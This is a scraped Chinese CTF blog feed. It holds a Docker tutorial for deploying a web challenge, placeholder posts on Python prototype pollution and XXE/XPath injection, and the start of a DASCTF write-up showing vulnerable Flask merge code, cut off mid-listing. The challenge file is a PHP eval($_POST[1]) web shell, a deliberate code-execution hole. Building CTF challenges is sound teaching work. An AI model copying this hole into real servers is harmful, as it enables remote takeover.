plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y vim</span><br></pre></td></tr></table></figure><h3 id="环境配置与搭建"><a href="#环境配置与搭建" class="headerlink" title="环境配置与搭建"></a>环境配置与搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230731142244821.png" alt="image-20230731142244821"></p><p>添加<code>index.php</code> 并且把下面指定的代码取消注释</p><h4 id="启动nginx和php服务"><a href="#启动nginx和php服务" class="headerlink" title="启动nginx和php服务"></a>启动nginx和php服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 检查 nginx 配置文件</span><br><span class="line">nginx -t</span><br><span class="line"># 重启 nginx</span><br><span class="line">service nginx restart </span><br><span class="line"># 启动 php7.4-fpm</span><br><span class="line">service php7.4-fpm start </span><br></pre></td></tr></table></figure><p>这里的<code>nginx -t</code> 可以用来检查修改的配置是否修改正确  如果修改错误的话会报错提醒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前进程</span><br><span class="line">ps -aux</span><br><span class="line"># 查看 nginx 状态</span><br><span class="line">service nginx status </span><br><span class="line"># 查看 php7.4-fpm 状态</span><br><span class="line">service php7.4-fpm status </span><br></pre></td></tr></table></figure><p><strong>检查这个<code>nginx</code>和<code>php</code>服务的运行状态</strong></p><p>然后去访问一下开放的端口   看<code>nginx</code>是否在正常运行</p><p><img src="../images/image-20230731143616100.png" alt="image-20230731143616100"></p><p>那么我们就去修改该目录下的文件  让其显示我们想要显示的内容</p><p>(<strong>将该html文件删除</strong>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">eval($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将上述内容写入   然后去访问</p><p><img src="../images/image-20230731143820087.png" alt="image-20230731143820087"></p><p>成功写入    </p><p><strong>(假如这是我们要出的题目   那么我们就可以尝试去将其变成镜像  方便部署)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br><span class="line">// .的意思是把当前目录下的文件都给打包</span><br><span class="line">// -t 后面是跟着镜像名字  :后面是标签   都可以自己定义</span><br></pre></td></tr></table></figure><p>在构造镜像之前 我们要编写<code>Dockerfile</code></p><p>(<strong>它的作用是能帮助我们起容器</strong>)</p><h4 id="编写Dockerfile和docker-compose-yml"><a href="#编写Dockerfile和docker-compose-yml" class="headerlink" title="编写Dockerfile和docker-compose.yml"></a>编写Dockerfile和docker-compose.yml</h4><p>写这个的目的就是为了能帮助我们<strong>自动化部署环境</strong></p><p><strong>(例如就是自动安装<code>nginx</code>和<code>php</code>等等之类的工作)</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;Ke1nys&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新软件源</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt install nginx -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装php7.4-fpm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y software-properties-common</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> add-apt-repository ppa:ondrej/php -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y php7.4-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除nginx默认html文件</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> /var/www/html/index.nginx-debian.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将题目源码复制过去</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/f1ag /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/default /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 755 /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R root:root /var/www/html </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启用脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./run.sh /root/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash">  <span class="built_in">chmod</span> +x /root/run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/root/run.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面注释都写的很清楚了</p><p>接着写一个<code>sh</code>文件来帮我们自动化开启<code>nginx</code>和<code>php</code></p><p><strong>run.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动nginx</span></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动php</span></span><br><span class="line">service php7.4-fpm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># # never exit，此处是为了运行完上条应用服务后，有对应的前台进程</span></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure><p>注释也是解释的很清楚了</p><p><strong><code>docker-compose.yml</code></strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定该文件版本</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># 把每个子目录视为一个镜像，开始构建</span></span><br><span class="line">services:</span><br><span class="line">  src: <span class="comment">#这个是文件目录名</span></span><br><span class="line">    <span class="comment"># 此处仅允许 image, build, ports，禁止其他字段出现，如果有 volume，cmd 等设置需求，请在 Dockerfile 里进行文件拷贝或者申明。</span></span><br><span class="line">    image: ctf/test1        <span class="comment">#镜像名字</span></span><br><span class="line">    build: ./           <span class="comment">#build的位置，docker会去web1中的dockerfile开始搭建</span></span><br><span class="line">    <span class="comment"># restart: always</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:80&quot;</span>           <span class="comment">#设置映射的断口</span></span><br><span class="line">    environment:</span><br><span class="line">      - FLAG=flag&#123;this_is_test_flag&#125;                      <span class="comment"># 这里定义了flag,但是不会覆盖sh里的$FLAG</span></span><br><span class="line">    <span class="comment">#   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # 获取容器的uuid作为flag 会报错</span></span><br></pre></td></tr></table></figure><p>注释也是写的很清楚了</p><p><code>dockerfile</code>和<code>docker-compose.yml</code>   要与这个源码里的文件名对应上  不然会报错</p><p><strong>最后完成的文件结构图</strong></p><p><img src="../images/image-20230731145619175.png" alt="image-20230731145619175"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br></pre></td></tr></table></figure><p><strong>生成镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -e 镜像id</span><br></pre></td></tr></table></figure><p>运行该镜像   </p><p>这样就能成功的将环境起起来了</p><h3 id="外网部署"><a href="#外网部署" class="headerlink" title="外网部署"></a>外网部署</h3><p>直接将文件发给自己的服务器上  然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这样就可以将题目成功的部署在外网上了</p><p><img src="../images/image-20230731150347683.png" alt="image-20230731150347683"></p><p>(要记得开启题目所需的端口   不然可能会访问失败)</p><p><img src="../images/image-20230731150438136.png" alt="image-20230731150438136"></p><p>这样就部署成功了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里写这个的话主要是为了记录这个&lt;strong&gt;学习&lt;code&gt;docker&lt;/code&gt;的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/YBaog/article/details/125349766&quot;&gt;参考文章1&lt;/a</summary>
      
    
    
    
    
    <category term="Docker" scheme="https://ke1nys.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>show-Python反序列化</title>
    <link href="https://ke1nys.github.io/posts/78e9e0c1.html"/>
    <id>https://ke1nys.github.io/posts/78e9e0c1.html</id>
    <published>2023-07-29T15:34:42.000Z</published>
    <updated>2023-08-17T09:33:39.340Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bfc3084065846ef3a57d7d0c25fc1a1dd0aa484ad8cccc2a82311f856c29a666">1a90164da2a38547586d85c848ea2323d762a3ffb367be5a4c22b191df8c9b7c3982a2e7b92a0b91b3f9bc979ba8e671a8d0cc06fe3aac9ec976bfc329f9a0901cecb781dcece9b667c68af84eeb7bdb236bd10bfbabd929b84c2259d527412eb962fff47e5641d35b42d9ded0e3333459cbcac5ddbbce906d3082c62854c9f5a6e8ea3a73727d4b4510319d12e8786d8b2f16166a48fd57ae00782b7e0c9a075eae8e2f9f833e26d011a3b26ca5c38e42d40898ef4ae4b0934d9446952bd67b1c0657e09544e71ab44b2ed9c09216fb4795da01248a337172fc414fa7c655bdf013695d0dfeeaa14aaedd0a7b01a0cd97c20bbe8a1b2f8718521f29780e3673b78a04de1c72e0f2bf9d513d605de9c6661c0600fd013f92abce148f227391e6a875ae259945f97a7e646a8fdea528c542bb2111997348320891a92890f5f2bc297799194203975b9e4437ec47c36b33351a81047a73b57d5b1db331649e1a66f7912ef50d396d3040f305e69dc1e60ace4db1d9793f62450d8fcc6d0869897eff58d9ef86bdf7e47aec229053e66896d55ce70455f7928e414eeb57b3bbd8eeb225bd972f68a58eca4d148fb81a600e1acec95cb4511e2503238909e88dd532d0360a924e78664af16d237d262267cbad5a52c652eafd79caa1317225ec4c8e613832c47845a2addf76c1adff66f31b18641a62892254481c3136caa824114c42c8c7541f5366a3fd9297f17baa0f1ebeea0ab924a8ef97168ee31eaca4c47032e2fbdcd2933df1222f30f724ddc1b92ebbb86e1bda077e98d44e17b057cd98bb08f20edcf7e382d29d79c615c1256a61eae683088097f0c32ea7ba7a08522acaa6d762a95e85392a7758e49fd9bbd7e925fff8b1b28731183c8be580f3eb57bfa9dea6690f8bac24621435358c397ada106d44b2a3d47f9e78a4fc465265f88792b646d6891d32c8eb2758dc7c8fe6e879e24fe055fe2484b25c02842a3f3b05ac0a6439a336f9d88a7c0ee3f888201fc001653243d387694fc77bfa48a2afedf6b81cdee4958419f85b7f91b6cae2062a4352df61a58858e284de2b420a98bc1c8a8468e659c22cec476f04f84cf02ef2e6fc6575c559c3c702d55b67d0665f7c284ad25c80e4692b110e8b88f6ae5e8919d1c3e5441f7be0d168ca3438e41cbe6e80ead61aeff73fde29784da5cd880a23cd0721b70da954f7c21ba10988e616cc6148ab65b5e43a5a3997d39e3786a45a000427d18e9be7b9f8e816bd2892d7fbf9919bf5171bf354a0934bc9176858143412bb7a6fa5db10e434f19bf4af43139881cbd73ed319d58cb1e00dce9fd634527c110a645c95fa5eddd0d9209b922cdca5ccc95125d0b085f99569f8c05ba70de81ad48dd80ac635028f044060b0e356ce9395257581e45e5cd144cd1e797b3cd0a67a650b0f8211291270b37ac2ba15a477acd78fa76f5d1dcafd0a23862a1fdabaec5699b43cbaf27a621c87db76571cbf11e0f4befe4ecd8e123ea97229bf14832d73705aaa67816ec9372cb81bcd2f02700e5c924bca2eaebdcf29a2b5ec9e1ff33ed25d8d59ec00b7ad3a12b9508536bc58c8442ee5422d5c046388c90ac46e07bc1f0e06091af07d2b09a8d817c01cbe621a0ba785bba7f9f74f72219ed2a1e15ff1e9c202f4cf1d26c3d7bd355fc1aa98a0d2bba6738b5b856c85f87bda85d815e7bec6efd1a273e396ba5db40936a92f61aca7ff54cb49cdd258508486ac845ccfa5f01323b035327122a4f114e63ef3e94823643304a8d2570282891c2cf4d2f43f0c19c21823b2f7fe55d2ebcfd2a4015db7c306b3b19646323bd3b2580b5182ccbd3fe28945d961872614abda10374137179084ae03b0d891a728c34e4f6e68823b94f618b23cbd5f533909146027b7563c4bde001dc5a0ad3753488ddf83824fdd78768295686f53aa1fc64b02952365bd35251f7428e8995231fe510a9cd10852be20a915336e40a160ad95d13f8a5dc9fcadd47d645e6ead3c7785646e9419cc1f28134572d94440b19e8ca2a7b1e85eeea79dfbb6272dc8b3313aede4265250f9f687fae61ba717882f1ca14e0aace97d7b6466c536e5eccaf14485070b6a4d6fb2914cb40b946bdd34107228612133ccca938b01fb7ad3ebb438145e8d5c0ccdd04b090f5ad5c80683c1bfcb094032cbc021accc6fc5f92b2cc0b2fb7be8dae3be378c86a4ad8b152adbcf9db2e705608016e9ee068a400ecf68adf09b5c9b2188bc8a7308f9bd040da97a1da856e2114a762b70d3cc3e672a2fa3e4756a610de17360d9ffcce5c0e44698d7cd0bf716cacf869cb8b2d702d688ddee1ff5247790ef43e1278398d6948f007b8c082ed384c5a74c0b95bd87daea98a46ef01e0724b89504622396988e038321a860fe004acfb27b33eceeaa2a1cee13000f81e35a181fec0c9063ae936b32dd902ca4e84677c88d0e706a41cbdb16b8f26b5981fdbae6810c7772865f4510fac85d14061b549e382f7131e9772f3c76ae9d8c39b0b2ea4c11bfa9c051cf12afdf5f484bf43bd5c255c44495bf244a7c07e130ab477c2b33005be76c31a112525f590fc8dd50acbc6568a6bf3af4c2c53dfd0f84113f905b2cf65467b1fa6c2377968c5dd7def6f1d8a7d1556e36fb622e3d48f65250b3ae90c6cd1c7c2605aa7801c5df5bb00c5c8fc164c15170fe4ccef59fb4d4f06be2fd5558497ae1b155b0de50c6c4b2d4ab6fc5c3ccbd65dbc2603837d05c0ffa34c64ab557ac13dd1e633c7fbbeb34805e69325aaea45c153ca2aa5e6e32b96ad04a8bd1c9ad2cc2ce6dd82dd29f48769a1ed16b12e7902681dd968a91cc8f2faef9a86f6d8e05007a8f671cd60bb1c8da64c17134def2077475248a5688d6e89dcbcbd737a0c36ba86f8f057db8dd8c38375a068104f7bd51a931caf2a45451420b75d65b8c525cda82f666f4c8a2b4bbe018cf18304d1613fdf16c5fc192cb33ef566d446ad02fb9b22f1585bce728c316ca574280e0aed3082e456a4b560c1a566d5fec1766dcb26fd891deae9b3e3553f33f77e15c85eab91ad1dc3037a04987b9e0c43e310a9132a05413d77328caca82ae7150fd43f2f9a4936d481121b76c9c71363e4caeadeda7a87b961d2f571b0655ba99f0b02ac983de7d67408a9010eab158a66a823224991d6dbd53509c3353eeca7806fb505682f9c568a2d94866fc6bdb10d1e626365925720a8dae5521c14afa13d40402dd937825f99af3841629caca4be5039bb16d43be852487ba365c040e89f5e5fa47907badfdc3fc3fcfdad4fb800f760f8821afc1b0515254140729b508730a04cd155eebb46765df8b024a655f6822525394f4058932e592abb216f816984319d31529965c27d2e15e5027a5ee5b7c1a688d3a8a30a03a113a15ef79d17838508babab214a7ed317ec176a436c621b6b6d91ecb1b9ce9d74d4bb7264d8d8c6c87764a8438661a03d28644c584d472c287e58ec01c58c69bd9516ba65db9d903eb55fc7c8c6d1fc3cf49c64176e44b26ee22b21a216fac6f674d6c4a7bed269c9ba4d73a4cba3ce1fe9d28861faece5409d74e25c58e2f8a647b62f5c7335b5921edf324d4a90ddd868d865550254e060036abbc67746afd0d88c5f83a69730449a725903a0d913b87bff542e93287fcfdb454b6e550bc4ca8f0c9790898b3ff0e0f67885d55b6539744541086dcd7bbe37b745e0cb2393882dc4a7855dd485a3df2f82d4fcd3c03814e58865b6571e60d0888c5a7b239ee2de1bb6ac74336641d9b3ebecb0d891873aa9f7fc90ef0819cb34028fb1414a446dcb05e06da121b0cfcfa6ba9b7e1bad0415afeae6a770a9f3eea3d95aadbaa1a767d9e0db3c1efd12c5f7b0e840a3176dba66fcdb02a0f218ac27b0b61d341f790e54cc0a52d05f72999199411d65422a645856e1eee4f30d9e828643f53ada579caa81639be5d51debdc94831a9a4c8718bd26cf6996bb3c2f9557bc55e2e6d3c01250134c433d0823fe681d65545628d170393ed145250c4d908df951979c77220fbd9ade174ebe3a67ecdbf712e168c27f61d80b86524ba4865032f8b11dcf020e62a280e356cb840042462670868ba4e859ee31ac1372667e6dbf1923a1f8363f1ffbefffdb30c4578544db7a3264fc06ece8d426353c98d32ab38d6b8c898a496f515742c71868e10f9d325b1b7b2077f97ad9f75d9caa69c924635e0fd0c7d4ad872db4f98986524a690460fe3515f4ac05616267e649293662d45331e1040b5001512a03c3e0344ec6d6920c63cb26915a68851a912d73dc98e680bf4403e4d403001f5a3c172b2b5034a990ad7a4403e0450520a8381b11e97ebd747c4442e7c5d8cd10734867d129897c6a94e9ba030638cd0043b401e8d55cc76a6da959658e23137cea7e08d47275f6e12615ca3aa8f0caff35b4440d9c80eda693f80df223a13a0f70a6fcbb5b433b7dddc2444009b6bf0a5043b5d68e5acd7babdfc77709750f1bc63961658979c27392861bed14d522016997e148cb52b45930aff5c9651ec7478ca81c20b5f1a4260edc804a2c6fea9c4fc9b06b3bf0a870b3c5fb92dd36964d36379363890fd9a089c0b1d5217228b9da3076c090ccf08aea1ae91741b6a386a3d51b32f7e9bb56acd0014626375ad9e1cdf5ec5d717d1e7fa29b8369da0e7e7c5391f148cd2993de352412e1676f8a713db10856199b0198ccec95aea703daab701fe8be9e00216e8b9c5456c66fca53e001e024b7d98d7b97642e4a4704933adf125dd3209455db5418ac2fe2b14855215ed8d53bcbc6f975399e28254f5d5bcee7f391d03006d6a17afa3683cecdea92de8a3cfcec55580241e3d3ebf702383325d11bb6204bb49d27d25b0387f86addd96191e17c583c3c8474a28c89d0154709aabe4b7e0818e3735d95070af0d7909cddd6456e85973a48b163a352be0c1695ac1ab3a55c021623d1da05ad6351037d61cad45bcdf68b68249a76a898a7f6ac7c86c55f3e73dd55893659021b84dbea8ca1ccf18e6eb0481e2dd45c0a4b98ec8d6ea78d43f12cc6ce7a045844d1ef31574d10a394c3d5ad9321bff98e33f41440cf7ff951773c134e56cdbf9529e5f3913001c1cb628f7218f0867543eb0a3821cc0e115576ff24c2bbab1b097dcca65aa837493eee1ef2f20af6c747405dca0ded756dce78858a65b3aa41e3f86d1dcbd58a920dc6a0a48fcd09fefdedc181c1201b6c3960dd334add94263d490fd53528fda09a819a39edf52063deccba01b65a0037e3bc24872344d123d6f4d9516c461cddfa3c53730f397a07df1cf86f0f7b348ec2356905774afb5c7f1b144482d3ea54854fb91c8bc68bb880f9dc713a562cfc895c3b78cf45b8fefd14dbf6c7452dcf4110f58930b5953e2a0e0e451c24c5f6cf3d916de7b38d65fda797c8c34182b007f79cc8604773af7f4c41432ae2e9933c9b532088f4c82d0f3dd399bdf330fa893b255d03a884ab10b894408834817d519f1947bd43f455ac3de00f534191914a586245f11c3760693a7c80e016373bb6307e895537fbfaa322bc61f117fe9119863fec8a23105f0521b4d40480f16f96b15deafdb47cde72bdb7da7d63b60e504869f0360e57dc83ed08dcea6e9a970389e9cb1f59900fc143317aecbe60de70b6790092a2dd580c3310f6998c2c821dfa2c592a71de32250da48776a2f18a2a0b4062d61453d23db68c7d935ded1a68</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Python反序列化" scheme="https://ke1nys.github.io/tags/show-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://ke1nys.github.io/posts/6893ad0d.html"/>
    <id>https://ke1nys.github.io/posts/6893ad0d.html</id>
    <published>2023-07-26T06:31:25.000Z</published>
    <updated>2023-07-29T08:13:42.299Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章是为了占位  </p><p>因为比赛的时候刚好遇到这里不会</p><p><img src="../images/image-20230726143731499.png" alt="image-20230726143731499"></p><p><a href="https://tttang.com/archive/1876/#toc__1">python原型链污染详解</a></p><p><code>Web -EzFlask</code>    这道题考察到了  </p><p>关于这道题的解在博客直接搜索这个比赛的wp就能看到了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为比赛的时候刚好遇到这里不会&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143731499.png&quot; alt=&quot;image-20230726143731499&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Python原型链污染" scheme="https://ke1nys.github.io/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>XXE-xpath注入</title>
    <link href="https://ke1nys.github.io/posts/9d9aaae5.html"/>
    <id>https://ke1nys.github.io/posts/9d9aaae5.html</id>
    <published>2023-07-26T06:30:56.000Z</published>
    <updated>2023-07-29T08:13:42.300Z</updated>
    
    <content type="html"><![CDATA[<p>这里这篇文章是为了占位  </p><p>因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅</p><p><img src="../images/image-20230726143326525.png" alt="image-20230726143326525"></p><p><strong>考点是xxe的xpath盲注</strong>  </p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">xpath详解</a></p><p><a href="https://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/">xxe和xpath详解</a></p><p><code>WEB -MyPicDisk</code>       这道题考察到了</p><p>wp的话在这个比赛的wp上 </p><p>直接在博客上搜索就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143326525.png&quot; alt=&quot;image-202307</summary>
      
    
    
    
    
    <category term="XXE-xpath注入" scheme="https://ke1nys.github.io/tags/XXE-xpath%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2023 &amp; 0X401-Web</title>
    <link href="https://ke1nys.github.io/posts/46437d33.html"/>
    <id>https://ke1nys.github.io/posts/46437d33.html</id>
    <published>2023-07-25T06:51:45.000Z</published>
    <updated>2023-07-29T08:13:42.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p><a href="https://tttang.com/archive/1876/#toc_object">python原型链污染</a></p><p><img src="../images/image-20230725145530694.png" alt="image-20230725145530694"></p><p><strong>提供源码  开始审计</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            